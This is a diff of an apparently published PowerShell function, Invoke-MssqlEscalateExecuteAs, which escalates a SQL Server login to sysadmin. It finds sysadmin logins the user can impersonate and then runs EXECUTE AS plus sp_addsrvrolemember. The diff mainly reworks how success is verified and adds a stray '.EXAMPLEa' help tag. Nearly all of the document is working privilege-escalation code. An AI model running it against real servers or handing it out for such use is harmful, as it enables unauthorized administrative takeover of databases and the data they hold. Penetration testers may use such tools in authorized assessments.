@@ -1,9 +1,9 @@
 # TODO
-# - fix verification check
 # - add alternative domain creds feature
-# - add adhoc query feature
+# - add arbitrary query feature
 # - make pretty
 # - update description and links
+# - fix double run bug
 
 function Invoke-MssqlEscalateExecuteAs
 {
@@ -17,7 +17,7 @@ function Invoke-MssqlEscalateExecuteAs
        privileges.  This script can also be used to add a new sysadmin instead of escalating the privileges of
        the existing user.  
 
-	.EXAMPLE
+	.EXAMPLEa
 	   Adding the current user to the syadmin role if the user has permissions to impersonate the sa account.
 
 	   PS C:\> Invoke-MssqlEscalateExecuteAs -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS
@@ -141,10 +141,10 @@ function Invoke-MssqlEscalateExecuteAs
     $conn.Open()
 
     # Setup query
-    $QueryElevate = "select is_srvrolemember('sysadmin') as IsSysAdmin"
+    $Query = "select is_srvrolemember('sysadmin') as status"
 
     # Execute query
-    $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
+    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
     $results = $cmd.ExecuteReader() 
 
     # Parse query results
@@ -152,9 +152,9 @@ function Invoke-MssqlEscalateExecuteAs
     $TableIsSysAdmin.Load($results)  
 
     # Check if current user is a sysadmin
-    $TableIsSysAdmin | Select-Object -First 1 IsSysAdmin | foreach {
+    $TableIsSysAdmin | Select-Object -First 1 status | foreach {
 
-        $Checksysadmin = $_.IsSysAdmin
+        $Checksysadmin = $_.status
         if ($Checksysadmin -ne 0){
                 Write-Host "[*] You're already a sysadmin - no escalation needed." -foreground "green"
                 Write-Host "[*] All Done."
@@ -196,7 +196,7 @@ function Invoke-MssqlEscalateExecuteAs
 	    Write-Host "[*] The current user doesn't have permissions to impersonate anyone." -foreground "red"
     }else{
 	    $ImpUserCount = $TableImpUsers.rows.count      
-	    Write-Host "[*] Found $ImpUserCount users that can be impersonated:" -foreground "green"
+	    Write-Host "[*] Found $ImpUserCount users that can be impersonated:" 
         $TableImpUsers | foreach{
             $ImpUser = $_.name
             Write-Host "[*] - $ImpUser"
@@ -241,7 +241,7 @@ function Invoke-MssqlEscalateExecuteAs
             
             # Check if the impersonatable user is a sysadmin
             if ($SysAdminStatus -eq 0){
-	            Write-Host "[*] - $ImpUser - NOT sysadmin" -foreground "red"
+	            Write-Host "[*] - $ImpUser - NOT sysadmin" 
             }else{
                 Write-Host "[*] - $ImpUser - sysadmin!" -foreground "green"
 
@@ -264,10 +264,7 @@ function Invoke-MssqlEscalateExecuteAs
 
     # Verify that a sysadmin user can be impersonated
     $ImpUserSysadminsCount = $TableImpUserSysAdmins.rows.count 
-    if ($ImpUserSysadminsCount -ne 0) {      
-
-        # Status user
-        Write-Host "[*] Attempting to$Message add $UsertoElevate to the sysadmin role via impersonation..."  
+    if ($ImpUserSysadminsCount -ne 0) {        
 
         # Open db connection
         $conn.Open()
@@ -283,6 +280,9 @@ function Invoke-MssqlEscalateExecuteAs
             $Message = ""
         }
 
+        # Status user
+        Write-Host "[*] Attempting to$Message add $UsertoElevate to the sysadmin role via impersonation..."
+
         # Get the sysadmin user that can be impersonated
         $TableImpUserSysAdmins | foreach {
             $ImpUser = $_.name
@@ -291,55 +291,35 @@ function Invoke-MssqlEscalateExecuteAs
         # Setup query
         $Query = "EXECUTE AS Login = '$ImpUser';
         $AddUser;
-        EXEC sp_addsrvrolemember '$UsertoElevate','sysadmin';"
+        EXEC sp_addsrvrolemember '$UsertoElevate','sysadmin';
+        SELECT IS_SRVROLEMEMBER('sysadmin','$UsertoElevate') as status;"
 
         # Execute query
         $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
         $results = $cmd.ExecuteReader() 
 
-        # Close db connection
-        $conn.Close()         
-
-        # -------------------------------------------------
-        # Verify privilege escalation worked
-        # -------------------------------------------------
-
         # Status user
         Write-Host "[*] Verifying that $UsertoElevate was added to the sysadmin role..."
 
-	    # Verify that privilege escalation works
-        If (-Not ($newuser -and $newPass)){
+        # Parse query results
+        $TableVerify = New-Object System.Data.DataTable
+        $TableVerify.Load($results)  
 
-            # Open db connection
-            $conn.Open()
+        # Check if user is a sysadmin
+        $TableVerify| Select-Object -First 1 status | foreach {
 
-            # Setup query
-            $Query = "select IS_SRVROLEMEMBER('sysadmin','$UsertoElevate') as status"
-
-            # Execute query
-            $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
-
-            # Parse query results
-            $results = $cmd.ExecuteReader() 
-            $TableVerify = New-Object System.Data.DataTable
-            $TableVerify.Load($results)  
-
-            # Get sysadmin status  - fix this!
-            $TableVerify
-            $VerifySysadmin = 1
-
-            # Verify sysadmin status
-            if ($VerifySysadmin -ne 0){
+            $VerifySysadmin = $_.status
+            if ($VerifySysadmin -eq 1){
                 Write-Host "[*] Success - $UsertoElevate is now a sysadmin!" -foreground "green"
                 Write-Host "[*] All Done."          
             }else{
                 Write-Host "[*] Failed - Something went wrong!." -foreground "red"
                 Write-Host "[*] All Done."
-            }           
-            
-            # Close db connection
-            $conn.Close()     
-         }       
+            } 
+        }  
+
+        # Close db connection
+        $conn.Close()                
     }else{
          Write-Host "[*] Sorry, the $ConnectUser account can't impersonate anyone that is a sysadmin ." -foreground "red" 
          Write-Host "[*] All done." 
